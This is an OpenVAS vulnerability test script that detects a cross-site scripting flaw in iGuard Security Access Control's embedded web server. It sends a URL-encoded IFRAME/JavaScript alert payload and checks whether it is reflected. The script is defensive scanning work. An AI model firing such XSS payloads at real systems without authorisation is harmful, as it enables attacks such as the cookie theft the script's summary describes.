###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_iguard_53355.nasl 12 2013-10-27 11:15:33Z jan $
#
# iGuard Security Access Control Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "iGuard Security Access Control is prone to a cross-site scripting
vulnerability because it fails to properly sanitize user-supplied
input in the embedded web server.

An attacker may leverage this issue to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and launch other attacks.";


if (description)
{
 script_id(103485);
 script_bugtraq_id(53355);
 script_version ("$Revision: 12 $");

 script_name("iGuard Security Access Control Cross Site Scripting Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53355");
 script_xref(name : "URL" , value : "http://iguard.me/iguard-access-control.html");

 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-05-08 10:33:52 +0200 (Tue, 08 May 2012)");
 script_description(desc);
 script_summary("Determine if iGuard Security Access Control is prone to a cross-site scripting vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

dirs = make_list(cgi_dirs());

url = '/index.html'; 

if(http_vuln_check(port:port, url:url,pattern:"(Server: iGuard|<TITLE>iGuard Security)")) {

  url = '/%3E%3C/font%3E%3CIFRAME%20SRC=%22JAVASCRIPT:alert(%27openvas-xss-test%27);%22%3E.asp';

  if(http_vuln_check(port:port, url:url,pattern:"<IFRAME SRC=.JAVASCRIPT:alert\('openvas-xss-test'\);.>")) {
    security_warning(port:port);
    exit(0);
  }  
}

exit(0);
